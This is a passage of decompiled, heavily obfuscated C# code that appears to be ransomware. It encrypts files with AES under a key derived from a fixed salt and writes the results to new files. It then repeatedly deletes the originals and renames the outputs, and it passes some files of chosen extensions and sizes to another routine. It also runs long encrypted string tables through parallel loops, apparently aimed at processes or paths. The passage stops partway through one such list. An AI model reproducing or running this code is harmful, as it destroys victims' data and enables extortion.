									lsRSnbfdzmPAmx(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!DUcsRxUyUOuZr)
									{
										XEtwPwqcBXn(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, LvwthqCIfyprjsma);
									}
									else
									{
										XEtwPwqcBXn(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (diLbjzXQsjUvfr)
									{
										try
										{
											File.AppendAllText(fNCnNJWJkI, ucFASnlDtvNA.getString_0(107390479) + CS_0024_003C_003E8__locals0.hAWPAYCtjM + ucFASnlDtvNA.getString_0(107389706) + ex6.Message + ucFASnlDtvNA.getString_0(107396627));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!StzmabfzgZhvrc)
						{
							if (!DUcsRxUyUOuZr)
							{
								lsRSnbfdzmPAmx(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + ucFASnlDtvNA.getString_0(107389715), LvwthqCIfyprjsma);
							}
							else
							{
								lsRSnbfdzmPAmx(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + ucFASnlDtvNA.getString_0(107389715), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!DUcsRxUyUOuZr)
								{
									XEtwPwqcBXn(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM, LvwthqCIfyprjsma);
								}
								else
								{
									XEtwPwqcBXn(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (diLbjzXQsjUvfr)
								{
									try
									{
										File.AppendAllText(fNCnNJWJkI, ucFASnlDtvNA.getString_0(107390479) + CS_0024_003C_003E8__locals0.hAWPAYCtjM + ucFASnlDtvNA.getString_0(107389706) + ex8.Message + ucFASnlDtvNA.getString_0(107396627));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (DUcsRxUyUOuZr)
						{
							if (CS_0024_003C_003E8__locals0.gHhZvtvHCcOv != ucFASnlDtvNA.getString_0(107389720))
							{
								SfCyHUXuiKgwteW(CS_0024_003C_003E8__locals0.hAWPAYCtjM + CS_0024_003C_003E8__locals0.gHhZvtvHCcOv, bytes2);
							}
							else
							{
								SfCyHUXuiKgwteW(CS_0024_003C_003E8__locals0.hAWPAYCtjM, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			CS_0024_003C_003E8__locals0.lnuYdimQEFE.Remove(CS_0024_003C_003E8__locals0.hAWPAYCtjM);
		});
	}

	private static void XXYCcfYUZoisqm(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (DzWFTAUXUsJj == getString_0(107396725))
					{
						foreach (string item in ewhHGOPmfx)
						{
							if (string_0.ToLower().EndsWith(item) && hyJckWvZQWcw == getString_0(107396725))
							{
								if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394045), getString_0(107394008), getString_0(107393995), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && hyJckWvZQWcw == getString_0(107396694))
							{
								try
								{
									ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394045), getString_0(107394008), getString_0(107393995), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389698)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389698), getString_0(107393932)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void XEtwPwqcBXn(string string_0, string string_1, byte[] byte_0)
	{
		if (DzWFTAUXUsJj == getString_0(107396725))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in ewhHGOPmfx)
			{
				if (string_0.ToLower().EndsWith(item) && hyJckWvZQWcw == getString_0(107396725))
				{
					if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394045), getString_0(107394008), getString_0(107393995), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && hyJckWvZQWcw == getString_0(107396694))
				{
					try
					{
						ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394045), getString_0(107394008), getString_0(107393995), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = dwwswYRnKWB.yexFGBxyBEuJjkPLr(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
		}
	}

	private static void lsRSnbfdzmPAmx(string string_0, string string_1, byte[] byte_0)
	{
		YTioAnMrlREUS CS_0024_003C_003E8__locals0 = new YTioAnMrlREUS();
		CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ = string_0;
		CS_0024_003C_003E8__locals0.jBYypFGUrsM = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string jBYypFGUrsM = CS_0024_003C_003E8__locals0.jBYypFGUrsM;
			FileStream fileStream = new FileStream(jBYypFGUrsM, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (JvyLVvgwySTVfgs == getString_0(107396725))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.jBYypFGUrsM.Length > 0)
				{
					if (DzWFTAUXUsJj == getString_0(107396725))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in ewhHGOPmfx)
						{
							if (CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ.ToLower().EndsWith(item) && hyJckWvZQWcw == getString_0(107396725))
							{
								if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394045), getString_0(107394008), getString_0(107393995), CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ.ToLower().EndsWith(item) && hyJckWvZQWcw == getString_0(107396694))
							{
								try
								{
									ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394045), getString_0(107394008), getString_0(107393995), CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.jBYypFGUrsM.EndsWith(getString_0(107389698)))
					{
						File.Move(CS_0024_003C_003E8__locals0.jBYypFGUrsM, CS_0024_003C_003E8__locals0.jBYypFGUrsM.Replace(getString_0(107389698), getString_0(107393932)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.jBYypFGUrsM))
							{
								File.Delete(CS_0024_003C_003E8__locals0.jBYypFGUrsM);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (diLbjzXQsjUvfr)
			{
				try
				{
					File.AppendAllText(fNCnNJWJkI, getString_0(107390462) + CS_0024_003C_003E8__locals0.UzxqcECsdUsalJ + getString_0(107389689) + ex2.Message + getString_0(107396610));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> eMZZVRukVgRk = EMZZVRukVgRk;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				QYoxJyabcEN(getString_0(107389636), string_0);
			};
		}
		Parallel.ForEach(eMZZVRukVgRk, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> source = yShCceaqxImzo;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				QYoxJyabcEN(getString_0(107393113), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> yyRbaEftoamR = YyRbaEftoamR;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				QYoxJyabcEN(HIZwQscayZMa(getString_0(107389627)), string_0);
			};
		}
		Parallel.ForEach(yyRbaEftoamR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (QiRNmqPOWrMtCh == getString_0(107396725))
		{
			string[] kPxzLUKEmVdQyD = KPxzLUKEmVdQyD;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					QYoxJyabcEN(HIZwQscayZMa(getString_0(107389627)), getString_0(107389602) + string_0 + getString_0(107389593));
				};
			}
			Parallel.ForEach(kPxzLUKEmVdQyD, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!bmwWGsqcQrk().Contains(getString_0(107389784)))
		{
			NffZNIbIlwcdlddH(xiHuEoHoRXESAY);
		}
		else
		{
			List<string> source2 = bXbpSdhsQQQk;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					QYoxJyabcEN(HIZwQscayZMa(zikllNgvJXLR(getString_0(107389556))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> source3 = hAoVEaJfEovikWoJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				QYoxJyabcEN(HIZwQscayZMa(getString_0(107389563)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> ykLPjYDuCfAlg = YkLPjYDuCfAlg;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				QYoxJyabcEN(getString_0(107390026), string_0);
			};
		}
		Parallel.ForEach(ykLPjYDuCfAlg, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		QYoxJyabcEN(getString_0(107389636), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		QYoxJyabcEN(getString_0(107393113), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		QYoxJyabcEN(HIZwQscayZMa(getString_0(107389627)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		QYoxJyabcEN(HIZwQscayZMa(getString_0(107389627)), getString_0(107389602) + string_0 + getString_0(107389593));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		QYoxJyabcEN(HIZwQscayZMa(zikllNgvJXLR(getString_0(107389556))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		QYoxJyabcEN(HIZwQscayZMa(getString_0(107389563)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		QYoxJyabcEN(getString_0(107390026), string_0);
	}

	static bpqMdVmtaEtPaZM()
	{
		Strings.CreateGetStringDelegate(typeof(bpqMdVmtaEtPaZM));
		SoSVvJbhzN = getString_0(107393364);
		LvwthqCIfyprjsma = null;
		pNBnwqWxvnZcdZ = getString_0(107396694);
		sCWngckDuqD = getString_0(107390049);
		ndBzFjvUeNH = new List<string>();
		EOuLUPioJmZ = new List<string>();
		jmNGPrOmjSIISc = getString_0(107396694);
		hUytBMdeRsO = getString_0(107393932);
		iLtpaOqpVUqJDx = getString_0(107393932);
		aYUpHUGdUIVC = getString_0(107396694);
		DWJYSGdBjcTBL = 0;
		FvCkrJmFGmOziw = getString_0(107396694);
		bTVdtQmloMp = getString_0(107396694);
		lCxFWzSgiFYn = getString_0(107396694);
		qNekJNHQbGgdlj = getString_0(107390004);
		QfgIHFkqWOl = getString_0(107396694);
		PWXfeHZgnWm = getString_0(107396694);
		VsJIukPqAguT = getString_0(107396694);
		daKWNUQSDBiFyu = getString_0(107396694);
		BoNIHLCorthXUO = new List<string>
		{
			HIZwQscayZMa(getString_0(107389999)),
			HIZwQscayZMa(getString_0(107390014)),
			HIZwQscayZMa(getString_0(107389989)),
			HIZwQscayZMa(getString_0(107389940)),
			HIZwQscayZMa(getString_0(107389947)),
			HIZwQscayZMa(getString_0(107389922)),
			HIZwQscayZMa(getString_0(107389873)),
			HIZwQscayZMa(getString_0(107389848)),
			HIZwQscayZMa(getString_0(107389855)),
			HIZwQscayZMa(getString_0(107389830)),
			HIZwQscayZMa(getString_0(107389269)),
			HIZwQscayZMa(getString_0(107389276)),
			HIZwQscayZMa(getString_0(107389251))
		};
		fxkaTZNzSZr = new List<string>();
		wwmnCAhnPVImbEsn = getString_0(107396694);
		kPnBwmxUOIE = getString_0(107396694);
		oyBhuhygfld = getString_0(107396694);
		eVEJPETDEKd = new List<string>();
		WzzaTIQBEQUdZBX = getString_0(107396694);
		JliYkBzhNMrnM = getString_0(107389194);
		ysmQyIRLiTDhstt = getString_0(107396694);
		cmTyFueGlRJlWd = getString_0(107396694);
		yShCceaqxImzo = new List<string>
		{
			HIZwQscayZMa(getString_0(107389177)),
			HIZwQscayZMa(getString_0(107389112)),
			HIZwQscayZMa(getString_0(107389079)),
			HIZwQscayZMa(getString_0(107389046)),
			HIZwQscayZMa(getString_0(107389525)),
			HIZwQscayZMa(getString_0(107389496)),
			HIZwQscayZMa(getString_0(107389471)),
			HIZwQscayZMa(getString_0(107389442)),
			HIZwQscayZMa(getString_0(107389365)),
			HIZwQscayZMa(getString_0(107389300)),
			HIZwQscayZMa(getString_0(107388755)),
			HIZwQscayZMa(getString_0(107388722)),
			HIZwQscayZMa(getString_0(107388689)),
			HIZwQscayZMa(getString_0(107388660)),
			HIZwQscayZMa(getString_0(107388631)),
			HIZwQscayZMa(getString_0(107388590)),
			HIZwQscayZMa(getString_0(107388581)),
			HIZwQscayZMa(getString_0(107389004)),
			HIZwQscayZMa(getString_0(107388987)),
			HIZwQscayZMa(getString_0(107388954)),
			HIZwQscayZMa(getString_0(107388925)),
			HIZwQscayZMa(getString_0(107388852)),
			HIZwQscayZMa(getString_0(107388811)),
			HIZwQscayZMa(getString_0(107388778)),
			HIZwQscayZMa(getString_0(107388249)),
			HIZwQscayZMa(getString_0(107388192)),
			HIZwQscayZMa(getString_0(107388119)),
			HIZwQscayZMa(getString_0(107388122)),
			HIZwQscayZMa(getString_0(107388049)),
			HIZwQscayZMa(getString_0(107388504)),
			HIZwQscayZMa(getString_0(107388439)),
			HIZwQscayZMa(getString_0(107388414)),
			HIZwQscayZMa(getString_0(107388349)),
			HIZwQscayZMa(getString_0(107388268)),
			HIZwQscayZMa(getString_0(107387691)),
			HIZwQscayZMa(getString_0(107387634)),
			HIZwQscayZMa(getString_0(107387601)),
			HIZwQscayZMa(getString_0(107387592)),
			HIZwQscayZMa(getString_0(107387551)),
			HIZwQscayZMa(getString_0(107387986)),
			HIZwQscayZMa(getString_0(107387957)),
			HIZwQscayZMa(getString_0(107387892)),
			HIZwQscayZMa(getString_0(107387851)),
			HIZwQscayZMa(getString_0(107387818)),
			HIZwQscayZMa(getString_0(107387809)),
			HIZwQscayZMa(getString_0(107387216)),
			HIZwQscayZMa(getString_0(107387203)),
			HIZwQscayZMa(getString_0(107387130)),
			HIZwQscayZMa(getString_0(107387053)),
			HIZwQscayZMa(getString_0(107387040)),
			HIZwQscayZMa(getString_0(107387475)),
			HIZwQscayZMa(getString_0(107387434)),
			HIZwQscayZMa(getString_0(107387393)),
			HIZwQscayZMa(getString_0(107387364)),
			HIZwQscayZMa(getString_0(107387323)),
			HIZwQscayZMa(getString_0(107387258)),
			HIZwQscayZMa(getString_0(107386669)),
			HIZwQscayZMa(getString_0(107386640)),
			HIZwQscayZMa(getString_0(107386627)),
			HIZwQscayZMa(getString_0(107386562)),
			HIZwQscayZMa(getString_0(107386533)),
			HIZwQscayZMa(getString_0(107386956)),
			HIZwQscayZMa(getString_0(107386891)),
			HIZwQscayZMa(getString_0(107386882)),
			HIZwQscayZMa(getString_0(107386853)),
			HIZwQscayZMa(getString_0(107386812)),
			HIZwQscayZMa(getString_0(107386187)),
			HIZwQscayZMa(getString_0(107386126)),
			HIZwQscayZMa(getString_0(107386085)),
			HIZwQscayZMa(getString_0(107386008)),
			HIZwQscayZMa(getString_0(107385975)),
			HIZwQscayZMa(getString_0(107386446)),
			HIZwQscayZMa(getString_0(107386401)),
			HIZwQscayZMa(getString_0(107386324)),
			HIZwQscayZMa(getString_0(107386267)),
			HIZwQscayZMa(getString_0(107385674)),
			HIZwQscayZMa(getString_0(107385645)),
			HIZwQscayZMa(getString_0(107385636)),
			HIZwQscayZMa(getString_0(107385571)),
			HIZwQscayZMa(getString_0(107385490)),
			HIZwQscayZMa(getString_0(107385465)),
			HIZwQscayZMa(getString_0(107385912)),
			HIZwQscayZMa(getString_0(107385883)),
			HIZwQscayZMa(getString_0(107385826)),
			HIZwQscayZMa(getString_0(107387634)),
			HIZwQscayZMa(getString_0(107385737)),
			HIZwQscayZMa(getString_0(107385728)),
			HIZwQscayZMa(getString_0(107385127)),
			HIZwQscayZMa(getString_0(107385082)),
			HIZwQscayZMa(getString_0(107385021)),
			HIZwQscayZMa(getString_0(107384996)),
			HIZwQscayZMa(getString_0(107385431)),
			HIZwQscayZMa(getString_0(107385414)),
			HIZwQscayZMa(getString_0(107388504)),
			HIZwQscayZMa(getString_0(107385349)),
			HIZwQscayZMa(getString_0(107385308)),
			HIZwQscayZMa(getString_0(107385251)),
			HIZwQscayZMa(getString_0(107388439)),
			HIZwQscayZMa(getString_0(107384666)),
			HIZwQscayZMa(getString_0(107384585)),
			HIZwQscayZMa(getString_0(107384496)),
			HIZwQscayZMa(getString_0(107384431)),
			HIZwQscayZMa(getString_0(107384926)),
			HIZwQscayZMa(getString_0(107388349)),
			HIZwQscayZMa(getString_0(107384817)),
			HIZwQscayZMa(getString_0(107387601)),
			HIZwQscayZMa(getString_0(107388268)),
			HIZwQscayZMa(getString_0(107384784)),
			HIZwQscayZMa(getString_0(107384727)),
			HIZwQscayZMa(getString_0(107387691)),
			HIZwQscayZMa(getString_0(107384694)),
			HIZwQscayZMa(getString_0(107384165)),
			HIZwQscayZMa(getString_0(107384084)),
			HIZwQscayZMa(getString_0(107388049)),
			HIZwQscayZMa(getString_0(107384091)),
			HIZwQscayZMa(getString_0(107384014)),
			HIZwQscayZMa(getString_0(107383985)),
			HIZwQscayZMa(getString_0(107383956)),
			HIZwQscayZMa(getString_0(107383943)),
			HIZwQscayZMa(getString_0(107384422)),
			HIZwQscayZMa(getString_0(107384365)),
			HIZwQscayZMa(getString_0(107384352)),
			HIZwQscayZMa(getString_0(107384327)),
			HIZwQscayZMa(getString_0(107384286)),
			HIZwQscayZMa(getString_0(107384209)),
			HIZwQscayZMa(getString_0(107384192)),
			HIZwQscayZMa(getString_0(107383623)),
			HIZwQscayZMa(getString_0(107383590)),
			HIZwQscayZMa(getString_0(107383545)),
			HIZwQscayZMa(getString_0(107383480)),
			HIZwQscayZMa(getString_0(107383439)),
			HIZwQscayZMa(getString_0(107388122)),
			HIZwQscayZMa(getString_0(107384192)),
			HIZwQscayZMa(getString_0(107383430)),
			HIZwQscayZMa(getString_0(107383881)),
			HIZwQscayZMa(getString_0(107383852)),
			HIZwQscayZMa(getString_0(107383835)),
			HIZwQscayZMa(getString_0(107383762)),
			HIZwQscayZMa(getString_0(107383701)),
			HIZwQscayZMa(getString_0(107383116)),
			HIZwQscayZMa(getString_0(107383087)),
			HIZwQscayZMa(getString_0(107383054)),
			HIZwQscayZMa(getString_0(107383013)),
			HIZwQscayZMa(getString_0(107382984)),
			HIZwQscayZMa(getString_0(107382939)),
			HIZwQscayZMa(getString_0(107383386)),
			HIZwQscayZMa(getString_0(107383353)),
			HIZwQscayZMa(getString_0(107383276)),
			HIZwQscayZMa(getString_0(107383215)),
			HIZwQscayZMa(getString_0(107383182)),
			HIZwQscayZMa(getString_0(107383169)),
			HIZwQscayZMa(getString_0(107382592)),
			HIZwQscayZMa(getString_0(107382559)),
			HIZwQscayZMa(getString_0(107382486)),
			HIZwQscayZMa(getString_0(107382469)),
			HIZwQscayZMa(getString_0(107388249)),
			HIZwQscayZMa(getString_0(107382440)),
			HIZwQscayZMa(getString_0(107382863)),
			HIZwQscayZMa(getString_0(107382854)),
			HIZwQscayZMa(getString_0(107382809)),
			HIZwQscayZMa(getString_0(107382736)),
			HIZwQscayZMa(getString_0(107382723)),
			HIZwQscayZMa(getString_0(107382662)),
			HIZwQscayZMa(getString_0(107382069)),
			HIZwQscayZMa(getString_0(107382052)),
			HIZwQscayZMa(getString_0(107381963)),
			HIZwQscayZMa(getString_0(107381906)),
			HIZwQscayZMa(getString_0(107381893)),
			HIZwQscayZMa(getString_0(107382364)),
			HIZwQscayZMa(getString_0(107382307)),
			HIZwQscayZMa(getString_0(107388192)),
			HIZwQscayZMa(getString_0(107382234)),
			HIZwQscayZMa(getString_0(107382205)),
			HIZwQscayZMa(getString_0(107382172)),
			HIZwQscayZMa(getString_0(107381587)),
			HIZwQscayZMa(getString_0(107381558)),
			HIZwQscayZMa(getString_0(107388778)),
			HIZwQscayZMa(getString_0(107381517)),
			HIZwQscayZMa(getString_0(107381500)),
			HIZwQscayZMa(getString_0(107381471)),
			HIZwQscayZMa(getString_0(107386533)),
			HIZwQscayZMa(getString_0(107381438)),
			HIZwQscayZMa(getString_0(107381471)),
			HIZwQscayZMa(getString_0(107381409)),
			HIZwQscayZMa(getString_0(107381380)),
			HIZwQscayZMa(getString_0(107381863)),
			HIZwQscayZMa(getString_0(107381782)),
			HIZwQscayZMa(getString_0(107381765)),
			HIZwQscayZMa(getString_0(107381724)),
			HIZwQscayZMa(getString_0(107381663)),
			HIZwQscayZMa(getString_0(107381634)),
			HIZwQscayZMa(getString_0(107381081)),
			HIZwQscayZMa(getString_0(107381004)),
			HIZwQscayZMa(getString_0(107380991)),
			HIZwQscayZMa(getString_0(107380958)),
			HIZwQscayZMa(getString_0(107380901)),
			HIZwQscayZMa(getString_0(107381336)),
			HIZwQscayZMa(getString_0(107381311)),
			HIZwQscayZMa(getString_0(107381278)),
			HIZwQscayZMa(getString_0(107381205)),
			HIZwQscayZMa(getString_0(107381176)),
			HIZwQscayZMa(getString_0(107381147)),
			HIZwQscayZMa(getString_0(107381114)),
			HIZwQscayZMa(getString_0(107413313)),
			HIZwQscayZMa(getString_0(107413240)),
			HIZwQscayZMa(getString_0(107413223)),
			HIZwQscayZMa(getString_0(107413190)),
			HIZwQscayZMa(getString_0(107413109)),
			HIZwQscayZMa(getString_0(107413608)),
			HIZwQscayZMa(getString_0(107413527)),
			HIZwQscayZMa(getString_0(107413482)),
			HIZwQscayZMa(getString_0(107413465)),
			HIZwQscayZMa(getString_0(107413400)),
			HIZwQscayZMa(getString_0(107413359)),
			HIZwQscayZMa(getString_0(107412838)),
			HIZwQscayZMa(getString_0(107412793)),
			HIZwQscayZMa(getString_0(107383762)),
			HIZwQscayZMa(getString_0(107412728)),
			HIZwQscayZMa(getString_0(107412687)),
			HIZwQscayZMa(getString_0(107412630)),
			HIZwQscayZMa(getString_0(107412633)),
			HIZwQscayZMa(getString_0(107413080)),
			HIZwQscayZMa(getString_0(107413047)),
			HIZwQscayZMa(getString_0(107413030)),
			HIZwQscayZMa(getString_0(107412969)),
			HIZwQscayZMa(getString_0(107412956)),
			HIZwQscayZMa(getString_0(107412879)),
			HIZwQscayZMa(getString_0(107412870)),
			HIZwQscayZMa(getString_0(107412269)),
			HIZwQscayZMa(getString_0(107412252)),
			HIZwQscayZMa(getString_0(107412223)),
			HIZwQscayZMa(getString_0(107412146))
		};
		EMZZVRukVgRk = new List<string>
		{
			HIZwQscayZMa(getString_0(107412105)),
			HIZwQscayZMa(getString_0(107412568)),
			HIZwQscayZMa(getString_0(107412551)),
			HIZwQscayZMa(getString_0(107412470)),
			HIZwQscayZMa(getString_0(107412453)),
			HIZwQscayZMa(getString_0(107412388)),
			HIZwQscayZMa(getString_0(107411767)),
			HIZwQscayZMa(getString_0(107411738))
		};
		YyRbaEftoamR = new List<string>
		{
			HIZwQscayZMa(getString_0(107411681)),
			HIZwQscayZMa(getString_0(107411648)),
			HIZwQscayZMa(getString_0(107411571)),
			HIZwQscayZMa(getString_0(107412066)),
			HIZwQscayZMa(getString_0(107412033)),
			HIZwQscayZMa(getString_0(107411952)),
			HIZwQscayZMa(getString_0(107411939)),
			HIZwQscayZMa(getString_0(107411906)),
			HIZwQscayZMa(getString_0(107411873)),
			HIZwQscayZMa(getString_0(107411840)),
			HIZwQscayZMa(getString_0(107411295)),
